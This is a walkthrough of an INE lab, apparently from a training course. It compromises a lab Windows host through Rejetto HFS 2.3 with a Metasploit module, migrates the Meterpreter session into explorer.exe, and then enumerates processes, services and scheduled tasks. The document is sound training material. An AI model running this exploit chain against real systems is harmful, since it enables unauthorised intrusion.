# Windows: Enumerating Processes and Services — INE Lab Walkthrough

> **Lab:** Enumerating Processes and Services  
> **Platform:** INE  
> **Target:** `demo.ine.local`  
> **Objective:** Gain access to a vulnerable Windows system and enumerate processes, services, running tasks, and scheduled tasks.

---

## 1. Lab Overview

This lab focuses on **post-exploitation enumeration on a Windows system**.

```text
Reachability Check
        ↓
Nmap Service Enumeration
        ↓
SearchSploit
        ↓
Rejetto HFS Exploitation
        ↓
Meterpreter Session
        ↓
Process Enumeration
        ↓
Process Identification & Migration
        ↓
Service Enumeration
        ↓
Process ↔ Service Mapping
        ↓
Scheduled Task Enumeration
```

---

## 2. Check Target Reachability

### Command

```bash
ping -c 4 demo.ine.local
```

### What it does

`ping` checks whether the target is reachable over the network. The `-c 4` option sends 4 ICMP echo requests.

The lab showed successful replies with **0% packet loss**, confirming connectivity.


---

## 3. Service and Version Enumeration with Nmap

### Command

```bash
nmap -sV demo.ine.local
```

### What it does

`nmap` scans the target for open ports. The `-sV` option performs **service/version detection**.

The important finding was:

```text
80/tcp   open   http   HttpFileServer httpd 2.3
```

This identified **Rejetto HTTP File Server 2.3** as the interesting attack surface.

### Why it matters

Version information helps determine whether a service may be vulnerable and guides vulnerability research.


---

## 4. Search for a Known Exploit

### Command

```bash
searchsploit rejetto
```

### What it does

`searchsploit` searches the local Exploit-DB database for publicly documented vulnerabilities and exploits.

The results included a **Metasploit Framework exploit** for Rejetto HTTP File Server.

### Why it matters

This connects enumeration to a possible exploitation path:

```text
Nmap → Rejetto HFS identified → SearchSploit → Known exploit
```


---

# 5. Gaining Initial Access

## 5.1 Start Metasploit

### Command

```bash
msfconsole
```

### What it does

Starts the Metasploit Framework Console.


---

## 5.2 Select the Rejetto HFS Exploit

### Command

```text
use exploit/windows/http/rejetto_hfs_exec
```

### What it does

Loads the Metasploit exploit module targeting the vulnerable Rejetto HFS HTTP service.

---

## 5.3 Set the Target

### Command

```text
set RHOSTS demo.ine.local
```

### What it does

`RHOSTS` means **Remote Hosts**. It specifies the system that should receive the exploit.

---

## 5.4 Execute the Exploit

### Command

```text
exploit
```

### What it does

Executes the selected exploit.

The lab successfully created a **Meterpreter session** on the Windows target.


---

# 6. Enumerating Windows Processes

### Command

```text
ps
```

### What it does

The Meterpreter `ps` command lists processes running on the compromised Windows system.

The output provides information such as:

- PID
- Process name
- Architecture
- Session
- User
- Executable path

### Why it matters

Process enumeration helps determine **what is running, who owns it, and where it is executing from**.

For a SOC analyst, unexpected processes, unusual executable paths, or suspicious privilege contexts can be useful investigation clues.


---

# 7. Find a Specific Process

### Command

```text
pgrep explorer.exe
```

### What it does

`pgrep` searches for a process by name and returns its **Process ID (PID)**.

For example:

```text
2252
```

means:

```text
explorer.exe → PID 2252
```

> **Note:** The PID can differ between lab instances.

### Why it matters

The PID can then be used to reference that specific process for Meterpreter operations.


---

# 8. Process Migration

### Command

```text
migrate 2252
```

### What it does

`migrate` attempts to move the Meterpreter session into another running process.

Here, `2252` is the PID returned by `pgrep explorer.exe`.

```text
Current Meterpreter process
          ↓
       migrate
          ↓
explorer.exe (PID 2252)
```

### Why it matters

Process migration demonstrates how post-exploitation activity can change the process context in which a session runs.

> The INE lab notes that migration requires an elevated session. The PID is environment-dependent, so use the PID returned by `pgrep`.


---

# 9. Enumerate Running Windows Services

First open a Windows command shell:

### Command

```text
shell
```

### What it does

Creates a Windows command shell from the Meterpreter session.

---

## 9.1 List Running Services

### Command

```cmd
net start
```

### What it does

`net start` displays Windows services that are currently **running**.

### Why it matters

Running services form part of the endpoint's active environment. Unexpected services or services associated with unfamiliar software may deserve investigation.


---

# 10. Detailed Service Enumeration

### Command

```cmd
wmic service list brief
```

### What it does

WMIC provides a command-line interface to Windows Management Instrumentation.

This command displays service information such as:

```text
Name
ProcessId
StartMode
State
Status
```

### Why it matters

The `ProcessId` field helps connect a service with the process hosting it.

```text
Service
   ↓
Process ID
   ↓
Process
```

> `wmic` is a legacy Windows utility. Modern systems may use PowerShell/CIM alternatives, but it is used here because it is part of the lab.


---

# 11. Map Processes to Services

### Command

```cmd
tasklist /SVC
```

### What it does

`tasklist` displays running processes. `/SVC` adds the services hosted by each process.

For example:

```text
Image Name     PID    Services
svchost.exe    580    BrokerInfrastructure, DcomLaunch, ...
spoolsv.exe    336    Spooler
```

### Why it matters

This helps answer:

> **Which services are being hosted by this process?**

This is especially useful for `svchost.exe`, where multiple Windows services may share a host process.


---

# 12. Enumerate Scheduled Tasks

### Command

```cmd
schtasks /query /fo LIST
```

### What it does

`schtasks` queries Windows Scheduled Tasks.

- `/query` retrieves configured tasks.
- `/fo LIST` formats the output as a detailed list.

The output can include:

```text
HostName
TaskName
Next Run Time
Status
Logon Mode
```

### Why it matters

Scheduled tasks can reveal automated execution and are important during Windows investigations because unexpected tasks may indicate suspicious activity or persistence.


---

# 13. Process and Service Enumeration — The Big Picture

```text
                    Windows Endpoint
                          │
          ┌───────────────┴───────────────┐
          ↓                               ↓
      Processes                         Services
          │                               │
         ps                         net start
          │                               │
   pgrep explorer.exe             wmic service list brief
          │                               │
     Get PID                        Service details
          │                               │
      migrate                           │
          │                               │
          └──────────────┬────────────────┘
                         ↓
                  tasklist /SVC
                         │
                         ↓
                Process ↔ Service
                    relationship
                         │
                         ↓
               schtasks /query
                         │
                         ↓
                Scheduled execution
```

---

# 14. SOC Analyst Perspective

### Process Enumeration

```text
ps
```

Helps identify what is executing and which user/context is associated with it.

### Service Enumeration

```text
net start
wmic service list brief
```

Helps identify active services, their state, startup mode, and process IDs.

### Process-Service Mapping

```text
tasklist /SVC
```

Shows which services are hosted by which processes.

### Scheduled Tasks

```text
schtasks /query /fo LIST
```

Helps identify automated execution and possible persistence points.

The important mindset is:

> **Don't just ask what command to run. Ask what evidence the command gives you and why that evidence matters.**

---

# 15. Key Takeaways

### 🔎 Enumerate before acting

Understanding the endpoint makes later investigation or exploitation more informed.

### 🧩 Processes and services are connected

A service may run inside a process, and `tasklist /SVC` helps expose that relationship.

### 👤 User context matters

The same executable can behave differently depending on the account under which it runs.

### ⚙️ Scheduled tasks deserve attention

Scheduled execution is legitimate in Windows, but unexpected tasks can also be associated with persistence.

### 🛡️ Think like a SOC analyst

Processes, services, users, PIDs, executable paths, and scheduled tasks are different pieces of the same endpoint story.

---

# 16. Command Cheat Sheet

```text
ping -c 4 demo.ine.local
```

Check target reachability.

```text
nmap -sV demo.ine.local
```

Identify open services and versions.

```text
searchsploit rejetto
```

Search for known Rejetto vulnerabilities.

```text
msfconsole
```

Start Metasploit.

```text
use exploit/windows/http/rejetto_hfs_exec
```

Load the Rejetto HFS exploit.

```text
set RHOSTS demo.ine.local
```

Set the target host.

```text
exploit
```

Execute the selected module.

```text
ps
```

Enumerate running processes.

```text
pgrep explorer.exe
```

Find the PID of `explorer.exe`.

```text
migrate <PID>
```

Attempt Meterpreter process migration.

```text
shell
```

Open a Windows command shell.

```cmd
net start
```

List running services.

```cmd
wmic service list brief
```

Display service information.

```cmd
tasklist /SVC
```

Map running processes to hosted services.

```cmd
schtasks /query /fo LIST
```

Enumerate scheduled tasks.

---

# 17. Conclusion

This lab demonstrated how to move from **initial access to systematic Windows endpoint enumeration**.

The main learning flow was:

```text
Discover
   ↓
Identify
   ↓
Exploit
   ↓
Access
   ↓
Enumerate
   ↓
Correlate
   ↓
Investigate
```

The key SOC takeaway is that **processes, services, users, PIDs, executable paths, and scheduled tasks provide different pieces of the same endpoint story**.

Understanding how these pieces connect makes Windows investigation much easier.
